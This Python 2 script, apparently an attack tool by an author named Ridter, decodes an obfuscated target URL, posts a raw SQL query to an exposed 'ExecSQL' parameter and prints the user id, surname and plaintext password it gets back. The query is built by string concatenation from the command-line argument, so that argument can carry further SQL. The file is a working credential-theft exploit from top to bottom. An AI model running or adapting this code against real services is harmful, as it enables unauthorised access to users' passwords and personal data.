# coding=utf-8
#############################################################
## @file    IPUserManage.py                                ##
## @date    2014-1-16                                      ##
## @author  Ridter                                         ##
## @Email   zuotonghk@gmail.com                            ##
#############################################################
import urllib
import urllib2
import sys
reload(sys)
sys.setdefaultencoding('utf8')
import re
show ='''
        Trace program: running
          Coding By Ridter                    
                                               
                        (`.         ,-,         
                        ` `.    ,;' /          
                         `.  ,'/ .'            
                          `. X /.'             
                .-;--''--.._` ` (              
              .'            /   `              
             ,           ` '   Q '             
             ,         ,   `._    \            
          ,.|         '     `-.;_'             
          :  . `  ;    `  ` --,.._;            
           ' `    ,   )   .'                   
              `._ ,  '   /_                    
                 ; ,''-,;' ``-                 
                  ``-..__``--`                 
                                               


'''

def decrypt(key, s):    
    c = bytearray(str(s).encode("gbk"))    
    n = len(c) 
    if n % 2 != 0 :    
        return ""    
    n = n // 2
    b = bytearray(n)    
    j = 0
    for i in range(0, n):    
        c1 = c[j]    
        c2 = c[j+1]    
        j = j+2
        c1 = c1 - 65
        c2 = c2 - 65
        b2 = c2*16 + c1    
        b1 = b2^ key    
        b[i]= b1    
    try:    
        return b.decode("gbk")    
    except:    
        return "failed"  
def post(userid):
	sql="select * from userinfo where userid='"+userid+"'"
	# have changed the hash for safe
	url= decrypt(89, 'BDNCNCJCDGGHGHLGJGLGHHIGAGKGHHOGLGHHIGOGJGGHMBKDIDLCNDKAMDLCPCCFDSGHDBPBBANAHHIDKCEDBCGHEBABBDAKAIAFBNBLBNBIDNCIDKAMDFDMDKDNCFR') 
	postData = {'ExecSQL' : sql}   
	postData = urllib.urlencode(postData)
	try:
		req = urllib2.Request(url,postData)
		response = urllib2.urlopen(req)
		the_page = response.read()
		return the_page
	except Exception,e:
		pass


def result(userid):
    html = post(userid)
    res1 = re.compile(r'<userid>(.+)<\/userid>')
    res2 = re.compile(r'<passwd>(.+)</passwd>')
    res3 = re.compile(r'<surename>(.+)</surename>')
    userid = res1.findall(html)
    passwd = res2.findall(html)
    suername = res3.findall(html)
    try:
        print "[*] The user id   is: "+userid[0]
        print "[*] The user name is: "+unicode(suername[0])
        print "[*] The passwd    is: "+passwd[0]
    except:
        print "NO RESULT"

    
def main():
	print show
	filename= sys.argv[0]
	if len(sys.argv)<2:
		print 'usage:  ' + filename + '  userid'
	else:
		userid = sys.argv[1]
		result(userid)
	
if __name__ == "__main__":
    try:
        main()
    except:
        print "Error !"

